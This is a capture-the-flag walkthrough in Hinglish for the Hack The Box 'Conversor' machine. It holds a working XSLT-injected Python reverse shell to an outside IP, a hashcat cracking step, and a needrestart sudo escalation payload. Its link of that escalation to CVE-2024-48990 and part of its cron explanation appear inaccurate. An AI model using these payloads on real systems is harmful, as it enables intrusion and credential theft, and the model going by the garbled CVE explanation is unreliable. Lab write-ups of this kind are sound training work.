1. Information Gathering
• Target machine ka IP identify hua (VPN connect hone ke baad).
• Nmap scan run kiya:
nmap -sS -sV <IP> -T4
◇ Results:
▪ Port 80 (HTTP) open
▪ Port 22 (SSH) open
▪ 
2. Web Enumeration
✔ Login + Registration page discovered
◇ Registration page me test user create karne ki try ki → username already exists error mila.
◇ Ye error verbose tha → attacker ko pata chala ke “test” user exist karta hai.
✔ Credential Guessing
◇ Login page par guess kiya:
▪ Username: test
▪ Password: test
◇ Login successful ho gaya → weak credential policy.

3. Source Code Disclosure
✔ "About" page me source code link mila
◇ Website ka full backend code downloadable tha.
◇ app.py se pura workflow samajh aya:
▪ XML/XSLT upload allowed
▪ Uploaded files script directory me save hotey hain
▪ Script directory ke andar cron script unhe process karti hai

✔ install.md me critical information mila:
◇ Server har 60 seconds me /var/www/conversor.htb/scripts/*.py run karta hai (cron job).
◇ Yani koi bhi user agar is directory me file daale → system automatically run karega.

4. XSLT Injection → Code Execution (Reverse Shell)
✔ How this worked (Backend Explanation — very important)
XSLT transformation ka process normally:
XML + XSLT → HTML Output
Lekin is application me:
◇ XSLT file user ke input ke through backend me process hoti hai.
◇ Application XSLT ko Python’s lxml library ke through evaluate karta hai.
◇ Agar XSLT me koi dangerous instruction likha ho (jaise python-like execution),
 toh backend usko evaluate kar sakta tha.
✔ Cron job
◇ Upload hone ke baad XSLT file automatically cron ke zariye backend script me process hoti thi
◇ Jo bhi XSLT transformation hoga uska result .html me save hota tha.
◇ Jab attacker ne malicious XSLT upload ki:
▪ Cron job ne usko process kiya
▪ Backend ne XSLT evaluator me code execute kiya
▪ Resultant HTML file access karne se attacker ko reverse shell mil gaya
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
   xmlns:xalan="http://xml.apache.org/xslt">

       <xsl:template match="/">
	 <!--Write reverse shell file into scripts folder -->
	 <xsl:document href="/var/www/conversor.htb/scripts/rev.py" method="text">
	   <![CDATA[
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.17.47",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
	]]>
       </xsl:document>
     <html><body>Done</body></html>
     </xsl:template> 


</xsl:stylesheet>
✔ Final Result
Attacker → www-data user ke shell me enter ho gaya.

5. Post-Exploitation Enumeration

✔ SQLite database found: users.db
◇ Access using:
sqlite3 users.db
.tables
◇ Table me username/password hashes stored the.
✔ Dumped credentials:
fismathack | <MD5 hash>
test       | <MD5 hash>

✔ MD5 hash crack kiya using:

hashcat -m 0 hash.txt rockyou.txt
◇ Cracked password mil gaya.
◇ SSH login successful ho gaya:
ssh fismathack@<IP>

6. Privilege Escalation Enumeration
◇ sudo -l run kiya:
▪ User needrestart as root run kar sakta tha.
◇ GTFOBins me koi direct privesc method nahi tha.

7. Payload Used: 
$nrconf{ui} = 'NeedRestart::UI::stdio';
        system("/bin/bash");

Backend Detail: What Actually Happened With Needrestart
Needrestart normally ek daemon restart checker hai.

✔ Iska kaam:
◇ System updates ke baad kaun se services restart honi chahiye
◇ Kaun se processes outdated libraries use kar rahe hain
✔ Kaise chalta hai:
◇ Needrestart config files ko Perl interpreter ke through read karta hai
◇ Perl ka strict mode usually arbitrary commands block karta hai
✔ Conversor Room ka twist:
Is HTB room me:
◇ Sudo ne needrestart ko root permissions me run karne ki permission di hui thi.
◇ Needrestart ka config evaluation mechanism misconfigured tha.
◇ Needrestart config me kuch values unsafe tarah evaluate ho rahi thi.
◇ Iss misconfiguration ki wajah se arbitrary code execute ho skta tha.

✔ Matlab:
Jis config ko tumne pass kiya:
needrestart -c file.conf
Us file ko needrestart ne privileged Perl interpreter ke andar evaluate kiya.

✔ Normal Perl strict mode block karta hai.
Lekin is room me:
◇ Needrestart ka config parser fully sanitized nahi tha
◇ Kuch unsafe evaluations allow ho rahe the
◇ Execution context root tha
◇ Isliye privesc possible hua


This is exactly the core of CVE‑2024‑48990.

✔ Final summary of backend:
1. Needrestart runs as root under sudo
2. Config files are evaluated as Perl code
3. Some versions/configs fail to sanitize inputs
4. Unsafe execution leads to arbitrary code execution
5. User becomes root
Yani tumhari config file root ke context me evaluate hui, aur execution occur hua.

8. Result
◇ Attacker became root.
◇ Room completed successfully.



Final Summary
Conversor room ke backend me 2 major security issues the:

1) XSLT engine unsafe execution
Backend Python lxml XSLT ko safely sandbox nahi karta tha.
 Cron job ne XSLT ko execute kar diya → code run hua → reverse shell.

2) Needrestart config evaluation flaw
Needrestart config Perl me evaluate hoti hai.
 Misconfiguration + sudo = root code execution.
